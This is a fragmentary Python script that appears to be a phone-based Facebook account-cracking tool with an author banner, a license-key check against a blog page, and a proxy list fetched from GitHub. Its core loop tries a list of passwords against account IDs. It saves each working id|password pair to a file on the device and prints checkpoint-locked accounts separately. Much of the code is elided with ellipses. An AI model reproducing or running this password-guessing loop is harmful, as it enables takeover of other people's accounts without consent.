...
fbks=('com.facebook.islam mokrani','com.facebook.lite','com.facebook.orca','com.facebook.katana')
...
try:
    ...
    time.sleep(1)
os.system('xdg-open https://t.me/ISLAMM17')
...
try:
    prox= requests.get('https://raw.githubusercontent.com/ISLAM/M17/main/.prox.txt').text
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
sys.stdout.write('\x1b]2; ISLAM MX \x07')
logo=("""\033[1;32m
 ██╗███████╗██╗      █████╗ ███╗   ███╗
██║██╔════╝██║     ██╔══██╗████╗ ████║
██║███████╗██║     ███████║██╔████╔██║
...
\033[1;37m===========================================
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mAuthor  : \033[1;37mISLAM
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mGithub  : \033[1;37mISLAM17
        ...
        #    linex()
            ...
            if xd in ['1','01']:
                ...
                exit()
                 ...
                 os.system('xdg-open https://www.facebook.com/ISLAMms17')
            elif xd in ['5','05']:
                 os.system('xdg-open https://t.ISLAM17xv')
            elif xd in ['0','00']:
                exit(' Thanks for use ♥ ')
            else:
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/ISLAM/ISLAAM -OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [ISLAAM -CP] '+ids+' | '+pas+'\033[1;97m')
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/ISLAM/.ISLAM.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/ISLAM/.ISLAM.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python ISLAM.py')
    ...
    r1 = requests.get('https://ISLAM17.blogspot.com/2023/12/devil.html').text
